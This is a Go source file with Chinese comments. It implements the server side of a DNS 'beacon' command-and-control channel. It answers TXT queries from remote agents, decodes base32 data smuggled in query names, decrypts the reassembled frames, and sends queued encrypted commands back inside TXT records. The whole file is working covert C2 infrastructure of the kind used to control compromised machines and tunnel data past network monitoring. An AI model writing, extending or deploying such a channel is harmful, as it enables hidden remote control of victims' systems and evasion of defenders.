// DNS 通道(beacon)的服务端 listener: 迷你 DNS 服务器(UDP)。
//
//   * 查询: 12B 头 + qname + qtype=TXT(16) + qclass=IN
//   * qname: `<sid:08x>[-<seq:04x>-<idx>-<total>].<base32(分片负载)每 63 字符一标签>.<domain>`
//   * 应答: TXT 的 RDATA **就是完整分片**(7B 头 + 负载, 与上行不同 —— 上行只编码负载)
//   * 每此交互捎带一片上行、带回一片下行(下行队列按对端源地址隔离)
//
// 会话逻辑完全复用 session.Manager: 与 HTTPS beacon 走同一条 BeaconFrame 路径,
// 出站命令经 Session outbox 在下次查询时被取走分片下发。
package beacon

import (
	"encoding/base32"
	"encoding/binary"
	"errors"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	// 下行每片负载量: 完整分片(7B 头 + 负载)要整体塞进一个 TXT RDATA,
	// 而 RDATA 有个 1B 段长前缀, 故 7B + 240B + 1B = 248 ≤ 255。
	dnsDownFragPayload = 240

	// 对端状态空闲回收周期(Agent 重连会换 UDP 源端口, 旧条目靠此项回收)
	dnsPeerIdle = 60 * time.Second

	// DNS 报文接收缓冲
	dnsRecvBufSize = 4096
)

var errBadDNSName = errors.New("DNS 名解析失败")

// dnsPeer 一个对端(按 UDP 源地址隔离)的传输态。
// 报序号是各 Agent 进程内独立递增的, 故重组器与发号器都必须按对端隔离。
type dnsPeer struct {
	reasm      *reassembler
	down       [][]byte // 待下发的分片队列(FIFO)
	nextSeq    uint16   // 下行报序号发号器
	idleAt     time.Time
	downWarned bool // TS-6: 队列超限已告警(避免刷屏)
}

// TS-6 资源护栏(容量评估 D-2/D-4): peers 无上限可被伪造源地址灌满内存,
// down 无上限可在 Agent 停拉时无限堆积。
const (
	maxDNSPeers  = 1024
	maxDownFrags = 4096
)

// DNSListener 是 DNS(beacon)通道的服务端。
type DNSListener struct {
	h      *Handler
	domain string // 已规范化为小写、无前导点

	mu    sync.Mutex
	peers map[string]*dnsPeer
}

// NewDNSListener 创建 DNS listener。domain 为与 Agent `--domain` 一致的查询域。
func NewDNSListener(h *Handler, domain string) *DNSListener {
	return &DNSListener{
		h:      h,
		domain: strings.ToLower(strings.Trim(domain, ".")),
		peers:  make(map[string]*dnsPeer),
	}
}

// Serve 在 conn 上跑 DNS 服务循环(阻塞, 由调用方 goroutine 承载)。
// 单 goroutine 顺序处理: DNS 通道本身是低速率请求驱动的, 无需并发。
func (l *DNSListener) Serve(conn *net.UDPConn) error {
	log.Printf("[dns] beacon 监听 %s domain=%s\n", conn.LocalAddr(), l.domain)
	buf := make([]byte, dnsRecvBufSize)
	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			if errors.Is(err, net.ErrClosed) {
				return nil
			}
			continue
		}
		query := append([]byte(nil), buf[:n]...)
		l.handleQuery(conn, query, raddr)
		l.gc(time.Now())
	}
}

// handleQuery 处理一次查询: 解析上行分片 → 重组 → 会话处理 → 取一片下行应答。
func (l *DNSListener) handleQuery(conn *net.UDPConn, query []byte, raddr *net.UDPAddr) {
	qname, qtype, qEnd, err := parseDNSQuestion(query)
	if err != nil || qtype != dnsQTXT {
		return // 非 TXT 查询(健康探测/其他解析器): 静默忽略
	}
	body, ok := l.stripDomain(qname)
	if !ok {
		return // 非本 listener 域
	}
	sid, chunk, ok := parseQnameMeta(body)
	if !ok {
		return
	}
	key := raddr.String()

	l.mu.Lock()
	defer l.mu.Unlock()

	peer := l.peers[key]
	if peer == nil {
		// TS-6: 对端上限 —— 超限静默丢弃本查询(与 beacon 限流"静默丢"铁律一致,
		// 不回错误防伪造源探测); 空闲 gc 会腾出名额。
		if len(l.peers) >= maxDNSPeers {
			return
		}
		peer = &dnsPeer{reasm: newReassembler()}
		l.peers[key] = peer
	}
	peer.idleAt = time.Now()

	if chunk != nil {
		if frame, done := peer.reasm.push(chunk); done {
			l.deliver(peer, raddr.IP.String(), int(sid), frame)
		}
	}

	// 下行: 每次查询只带回一片, 其余留待后续查询取走
	var rdata []byte
	if len(peer.down) > 0 {
		rdata = peer.down[0]
		peer.down = peer.down[1:]
	}
	_, _ = conn.WriteToUDP(buildTXTReply(query, qEnd, rdata), raddr)
}

// deliver 处理一个重组完成的完整载荷: 握手帧消费 / 解密 / 会话路由 / outbox 命令入下行队列。
func (l *DNSListener) deliver(peer *dnsPeer, remoteIP string, sid int, payload []byte) {
	h := l.h
	// X25519 握手帧(明文 "KE"+key_id+eph_pub): 消费并登记会话密钥, 无业务响应
	if h.xbox != nil && h.xbox.Handshake(payload) {
		log.Printf("[dns][KE] 握手帧已消费 key_id=%d len=%d from %s\n",
			handshakeKeyID(payload), len(payload), remoteIP)
		return
	}
	frame, keyID, err := h.decrypt(payload)
	if err != nil {
		log.Printf("[dns] decrypt fail: %v (len=%d)\n", err, len(payload))
		return
	}
	if sid <= 0 {
		sid = frameSessionID(frame) // qname 无会话标识时退回载荷内身份
	}
	// 通道类型 = dns(本文件即 DNS beacon 入口), 随会话写入 transport 列。
	next, err := h.mgr.BeaconFrame(remoteIP, sid, frame, "dns")
	if err != nil {
		log.Printf("[dns] BeaconFrame: %v\n", err)
		return
	}
	if next == nil {
		// 冲突帧被忽略: 无 outbox 可回带
		log.Printf("[dns] BeaconFrame: 帧被忽略(会话冲突)\n")
		return
	}
	// 出站命令: 全部取出 → 加密 → 分片入队(每帧独立报序号, 对端按序号分别聚合)
	for {
		cmdFrame, ok := next.PollOutbox()
		if !ok {
			break
		}
		enc, err := h.encrypt(keyID, cmdFrame)
		if err != nil {
			log.Printf("[dns] encrypt fail: %v\n", err)
			break
		}
		frags := fragment(enc, dnsDownFragPayload, peer.nextSeq)
		if frags == nil {
			log.Printf("[dns] 下行帧过大, 超 255 片上限 (len=%d), 丢弃\n", len(enc))
			break
		}
		// TS-6: 下行队列上限 —— Agent 停拉时防无限堆积(丢新帧保 FIFO; seq 不递增,
		// 未入队帧不占号)。
		if len(peer.down)+len(frags) > maxDownFrags {
			if !peer.downWarned {
				log.Printf("[dns] 下行队列超限(%d+%d > %d), 丢弃直至 Agent 恢复取件\n",
					len(peer.down), len(frags), maxDownFrags)
				peer.downWarned = true
			}
			break
		}
		peer.downWarned = false
		peer.nextSeq++
		peer.down = append(peer.down, frags...)
	}
}

// gc 清理空闲对端(Agent 离线/重连换端口后的残留队列)。
func (l *DNSListener) gc(now time.Time) {
	l.mu.Lock()
	defer l.mu.Unlock()
	for k, p := range l.peers {
		if now.Sub(p.idleAt) > dnsPeerIdle {
			delete(l.peers, k)
		}
	}
}

// stripDomain 剥掉 qname 的查询域后缀, 返回主体(不匹配返回 false)。
func (l *DNSListener) stripDomain(qname string) (string, bool) {
	suffix := "." + l.domain
	if !strings.HasSuffix(qname, suffix) {
		return "", false
	}
	return strings.TrimSuffix(qname, suffix), true
}

// ===== DNS 报文解析/构造 =====

const dnsQTXT = 16 // TXT

// parseDNSQuestion 解析查询, 返回 qname(点分小写)、qtype 与 question 段结束偏移。
func parseDNSQuestion(req []byte) (qname string, qtype uint16, qEnd int, err error) {
	if len(req) < 12 {
		return "", 0, 0, errBadDNSName
	}
	qname, err = decodeDNSName(req, 12)
	if err != nil {
		return "", 0, 0, err
	}
	off, err := skipDNSName(req, 12)
	if err != nil || off+4 > len(req) {
		return "", 0, 0, errBadDNSName
	}
	qtype = binary.BigEndian.Uint16(req[off:])
	return qname, qtype, off + 4, nil
}

// skipDNSName 跳到名字之后(压缩指针即名字结束), 与 Agent 侧 dns::SkipName 同语义。
func skipDNSName(msg []byte, off int) (int, error) {
	for {
		if off >= len(msg) {
			return 0, errBadDNSName
		}
		l := int(msg[off])
		if l == 0 {
			return off + 1, nil
		}
		if l&0xC0 == 0xC0 {
			if off+2 > len(msg) {
				return 0, errBadDNSName
			}
			return off + 2, nil
		}
		if l&0xC0 != 0 || off+1+l > len(msg) {
			return 0, errBadDNSName
		}
		off += 1 + l
	}
}

// decodeDNSName 解析域名(支持压缩指针), 统一小写 —— DNS 大小写不敏感, 且中间设备
// 可能改写大小写, 故比较与 base32 解码前一律归一化。
func decodeDNSName(msg []byte, start int) (string, error) {
	var sb strings.Builder
	off := start
	ptrs := 0
	for {
		if off >= len(msg) {
			return "", errBadDNSName
		}
		l := int(msg[off])
		if l == 0 {
			return sb.String(), nil
		}
		if l&0xC0 == 0xC0 {
			if off+2 > len(msg) || ptrs >= 8 { // 指针跟随上限, 防环
				return "", errBadDNSName
			}
			off = int(binary.BigEndian.Uint16(msg[off:off+2]) & 0x3FFF)
			ptrs++
			continue
		}
		if l&0xC0 != 0 || off+1+l > len(msg) {
			return "", errBadDNSName
		}
		if sb.Len() > 0 {
			sb.WriteByte('.')
		}
		for i := off + 1; i <= off+l; i++ {
			c := msg[i]
			if c >= 'A' && c <= 'Z' {
				c += 'a' - 'A'
			}
			sb.WriteByte(c)
		}
		off += 1 + l
	}
}

// parseQnameMeta 拆 qname 主体(域已剥离):
//
//	`<sid:08x>`                                    —— 探活/空闲轮询, 无分片
//	`<sid:08x>-<seq:04x>-<idx>-<total>.<base32…>`  —— 分片
//
// 返回会话 id 与**重建的完整分片**(7B 头 + 负载), 无分片时 chunk 为 nil。
func parseQnameMeta(body string) (sid uint64, chunk []byte, ok bool) {
	labels := strings.Split(body, ".")
	parts := strings.Split(labels[0], "-")
	sid, err := strconv.ParseUint(parts[0], 16, 64)
	if err != nil {
		return 0, nil, false
	}
	switch len(parts) {
	case 1:
		return sid, nil, true
	case 4:
	default:
		return 0, nil, false
	}
	// 子域名主体的标签不超过 32 个, 防畸形名构造超长 base32 串
	if len(labels) > 32 {
		return 0, nil, false
	}
	seq, err1 := strconv.ParseUint(parts[1], 16, 16)
	idx, err2 := strconv.ParseUint(parts[2], 10, 8)
	total, err3 := strconv.ParseUint(parts[3], 10, 8)
	if err1 != nil || err2 != nil || err3 != nil {
		return 0, nil, false
	}
	if total == 0 || idx >= total || len(labels) < 2 {
		return 0, nil, false
	}
	// base32(RFC4648 无 padding; Agent 侧输出小写, 这里统一大写后解码)
	raw, err := base32.StdEncoding.WithPadding(base32.NoPadding).
		DecodeString(strings.ToUpper(strings.Join(labels[1:], "")))
	if err != nil {
		return 0, nil, false
	}
	// 重建 7B 头: 上行 qname 只编码分片**负载**(见 DnsWireCodec BuildQname 从 kHeaderSize 起),
	// 序号/片序/总片数在 meta 里, 合成后交给与下行同一个重组器
	chunk = make([]byte, datagramHeaderSize+len(raw))
	chunk[0] = datagramMagic
	binary.LittleEndian.PutUint16(chunk[1:3], uint16(seq))
	chunk[3] = byte(idx)
	chunk[4] = byte(total)
	binary.LittleEndian.PutUint16(chunk[5:7], uint16(len(raw)))
	copy(chunk[datagramHeaderSize:], raw)
	return sid, chunk, true
}

// buildTXTReply 构造 TXT 应答: question 段原样回显(保真, 含任何压缩编码),
// rdata 为空则回无答案应答(QR=1/RCODE=0)。字段布局须与 Agent 侧
// dns::ParseTxtResponse 的解析路径一致(ID 回显 + QR=1 + RCODE=0 + answer 取 type=16)。
func buildTXTReply(query []byte, qEnd int, rdata []byte) []byte {
	out := make([]byte, 0, qEnd+len(rdata)+32)
	// 头: ID 回显 | flags=0x8180(QR=1 RD=1 RA=1 RCODE=0) | QD=1 | AN=0/1 | NS=AR=0
	out = append(out, query[0], query[1], 0x81, 0x80, 0x00, 0x01)
	if len(rdata) > 0 {
		out = append(out, 0x00, 0x01)
	} else {
		out = append(out, 0x00, 0x00)
	}
	out = append(out, 0x00, 0x00, 0x00, 0x00)
	// question 原样回显
	out = append(out, query[12:qEnd]...)
	if len(rdata) == 0 {
		return out
	}
	// answer: NAME=指针 C00C | TYPE=TXT(16) | CLASS=IN | TTL=60 | RDLEN | [1B 段长][数据]
	out = append(out, 0xC0, 0x0C, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00, 0x3C)
	rdlen := len(rdata) + 1
	out = append(out, byte(rdlen>>8), byte(rdlen), byte(len(rdata)))
	out = append(out, rdata...)
	return out
}

// handshakeKeyID 从握手帧取 key_id(仅用于日志)。
func handshakeKeyID(frame []byte) uint64 {
	if len(frame) < 10 {
		return 0
	}
	return binary.BigEndian.Uint64(frame[2:10])
}
